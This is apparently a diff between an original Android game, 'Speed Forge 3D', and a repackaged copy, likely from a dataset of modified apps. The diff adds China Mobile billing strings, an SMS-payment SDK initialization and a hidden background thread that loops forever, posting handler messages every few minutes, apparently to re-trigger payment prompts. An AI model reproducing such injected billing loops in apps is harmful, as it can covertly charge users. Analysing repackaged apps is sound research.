+> 尊敬的用户，您正在使用中国移动{0}业务中的游戏，需要通过移动网络进行订购关系验证，如果您是中国移动{0}的订购用户，将可免费使用该游戏，如果不是，则需要付费后方可继续使用，请检查您的移动网络是否可用！"</string>
+>     <string name="gc_billing_ok">付费成功！</string>
+>     <string name="gc_billing_ok_history">已付费成功！</string>
+>     <string name="gc_billing_fail">您的付费操作失败了，请稍后重试！</string>
+>     <string name="gc_billing_require">"不进行付费，您将无法获得更好的游戏体验，是否确认？
+> 
+> 点击《不购买》不进行付费，点击《返回》回到付费界面"</string>
+>     <string name="gc_billing_no_simcard">短信激活失败，请检查SIM卡！</string>
+>     <string name="gc_billing_simcard_unavailable">没有可用中国移动SIM卡！</string>
+>     <string name="gc_billing_check_network">找不到可用网络，请检查您当前的网络设置！</string>
+>     <string name="gc_billing_network_airplane">当前设备处于飞行模式，无可用网络！</string>
+>     <string name="gc_billing_network_multi">当前设备存在重复网络，无可用网络！</string>
+>     <string name="gc_billing_cmgc_game_tag">此游戏没有配置中国移动标识信息，不能继续使用！</string>
+>     <string name="gc_billing_dialog_charging">正在处理付费请求...</string>
+>     <string name="gc_billing_invalid_china_mobile_card">请输入有效的手机号码！</string>
+>     <string name="gc_billing_fail_phone">您的计费请求失败啦，请尝试输入手机号码进行计费！</string>
+>     <string name="gc_billing_fail_vericode">短信验证码获取失败</string>
+>     <string name="gc_billing_no_charge">未找到计费信息！</string>
+>     <string name="gc_billing_no_vericode">请输入您收到的短信验证码！</string>
+>     <string name="gc_billing_no_phone_number">未找到手机号码，请重试！</string>
+>     <string name="gc_billing_info_title">感谢您支持正版游戏</string>
+>     <string name="gc_billing_info_title_2">游戏付费确认</string>
+>     <string name="gc_billing_net_info">您需要输入手机号码，以获取短信验证码，在进入确认界面输入正确验证码之前，不会产生费用。</string>
+>     <string name="gc_billing_net_verifycode">短信验证码：</string>
+>     <string name="gc_billing_net_verifycode_1">请在确认游戏付费前，正确输入您手机上收到的随机短信验证码。</string>
+>     <string name="gc_billing_net_verifycode_2">短信验证码在5分钟内有效，超过时间内仍未收到验证码，建议您稍后重试。</string>
+>     <string name="gc_billing_net_phone">手机号码：（请输入正确的{0}）</string>
+>     <string name="gc_billing_net_phone_2">移动手机号码</string>
+>     <string name="gc_billing_more_time_error">您的付费请求太频繁，请稍后重试！</string>
+>     <string name="gc_billing_net_contacts">好友代付</string>
+>     <string name="gc_billing_net_contacts_error">没有找到联系人，您可以手动输入付费手机号码</string>
+>     <string name="gc_billing_dialog_sure_space">　确定　</string>
+>     <string name="gc_billing_dialog_clear_space">　取消　</string>
+>     <string name="gc_billing_dialog_continue">　继续　</string>
+>     <string name="gc_billing_dialog_exit">　退出　</string>
+>     <string name="gc_billing_dialog_information">提示</string>
+>     <string name="gc_billing_dialog_sure">确定</string>
+>     <string name="gc_billing_dialog_clear">取消</string>
+>     <string name="gc_billing_dialog_reject">不购买</string>
+>     <string name="gc_billing_dialog_positive">继续</string>
+>     <string name="gc_billing_dialog_neutral">结束</string>
+>     <string name="gc_billing_dialog_cancel">返回</string>
+4c65
+<     <string name="app_name">Speed Forge 3D</string>
+---
+>     <string name="app_name">3D重力飞行</string>
+Somente em result/APP_19/App_M_19/smali: cn
+diff -r result/APP_19/App_B_19/smali/Mag3DLite/GameApp/CSettings.smali result/APP_19/App_M_19/smali/Mag3DLite/GameApp/CSettings.smali
+181c181
+<     const-string v2, "Mine1"
+---
+>     const-string v2, "001"
+228c228
+<     const-string v2, "Mine2"
+---
+>     const-string v2, "002"
+273c273
+<     const-string v2, "Base"
+---
+>     const-string v2, "003"
+320c320
+<     const-string v2, "Factory"
+---
+>     const-string v2, "004"
+365c365
+<     const-string v2, "Colony"
+---
+>     const-string v2, "005"
+410c410
+<     const-string v2, "Channels"
+---
+>     const-string v2, "006"
+461c461
+<     const-string v2, "HCM 4020"
+---
+>     const-string v2, "002"
+521c521
+<     const-string v2, "HCM 1001"
+---
+>     const-string v2, "003"
+581c581
+<     const-string v2, "HCM 2000"
+---
+>     const-string v2, "001"
+Somente em result/APP_19/App_M_19/smali/Mag3DLite/SF3D: GameMain$3$1.smali
+Somente em result/APP_19/App_M_19/smali/Mag3DLite/SF3D: GameMain$3$2.smali
+Somente em result/APP_19/App_M_19/smali/Mag3DLite/SF3D: GameMain$3.smali
+diff -r result/APP_19/App_B_19/smali/Mag3DLite/SF3D/GameMain.smali result/APP_19/App_M_19/smali/Mag3DLite/SF3D/GameMain.smali
+4a5,7
+> # interfaces
+> .implements Ljava/lang/Runnable;
+> 
+36a40,41
+> .field private handler:Landroid/os/Handler;
+> 
+261a267,295
+> .method public initGameinfo()V
+>     .locals 2
+> 
+>     .prologue
+>     .line 40
+>     invoke-static {p0}, Lcn/emagsoftware/gamebilling/api/GameInterface;->initializeApp(Landroid/app/Activity;)V
+> 
+>     .line 42
+>     new-instance v0, LMag3DLite/SF3D/GameMain$3;
+> 
+>     invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
+> 
+>     move-result-object v1
+> 
+>     invoke-direct {v0, p0, v1}, LMag3DLite/SF3D/GameMain$3;-><init>(LMag3DLite/SF3D/GameMain;Landroid/os/Looper;)V
+> 
+>     iput-object v0, p0, LMag3DLite/SF3D/GameMain;->handler:Landroid/os/Handler;
+> 
+>     .line 147
+>     new-instance v0, Ljava/lang/Thread;
+> 
+>     invoke-direct {v0, p0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
+> 
+>     invoke-virtual {v0}, Ljava/lang/Thread;->start()V
+> 
+>     .line 148
+>     return-void
+> .end method
+> 
+265a300,301
+>     invoke-virtual {p0}, LMag3DLite/SF3D/GameMain;->initGameinfo()V
+> 
+586a623,702
+> .end method
+> 
+> .method public run()V
+>     .locals 4
+> 
+>     .prologue
+>     .line 338
+>     :goto_0
+>     :try_start_0
+>     iget-object v2, p0, LMag3DLite/SF3D/GameMain;->handler:Landroid/os/Handler;
+> 
+>     invoke-virtual {v2}, Landroid/os/Handler;->obtainMessage()Landroid/os/Message;
+> 
+>     move-result-object v1
+> 
+>     .line 339
+>     .local v1, "message":Landroid/os/Message;
+>     sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;
+> 
+>     const-string v3, "11111111111"
+> 
+>     invoke-virtual {v2, v3}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
+> 
+>     .line 341
+>     const/4 v2, 0x1
+> 
+>     iput v2, v1, Landroid/os/Message;->what:I
+> 
+>     .line 342
+>     iget-object v2, p0, LMag3DLite/SF3D/GameMain;->handler:Landroid/os/Handler;
+> 
+>     invoke-virtual {v2, v1}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z
+> 
+>     .line 346
+>     const-wide/32 v2, 0x1d4c0
+> 
+>     invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
+> 
+>     iget-object v2, p0, LMag3DLite/SF3D/GameMain;->handler:Landroid/os/Handler;
+> 
+>     invoke-virtual {v2}, Landroid/os/Handler;->obtainMessage()Landroid/os/Message;
+> 
+>     move-result-object v1
+> 
+>     .line 347
+>     const/4 v2, 0x2
+> 
+>     iput v2, v1, Landroid/os/Message;->what:I
+> 
+>     .line 348
+>     sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;
+> 
+>     const-string v3, "222222222"
+> 
+>     invoke-virtual {v2, v3}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
+> 
+>     .line 349
+>     iget-object v2, p0, LMag3DLite/SF3D/GameMain;->handler:Landroid/os/Handler;
+> 
+>     invoke-virtual {v2, v1}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z
+> 
+>     .line 352
+>     const-wide/32 v2, 0x75300
+> 
+>     invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
+>     :try_end_0
+>     .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
+> 
+>     goto :goto_0
+> 
+>     .line 356
+>     .end local v1    # "message":Landroid/os/Message;
+>     :catch_0
+>     move-exception v0
+> 
+>     .line 358
+>     .local v0, "e":Ljava/lang/InterruptedException;
+>     invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V
+> 
+>     goto :goto_0
